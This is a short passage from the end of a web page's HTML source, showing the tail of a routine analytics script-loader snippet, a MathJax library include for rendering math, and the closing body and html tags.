document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
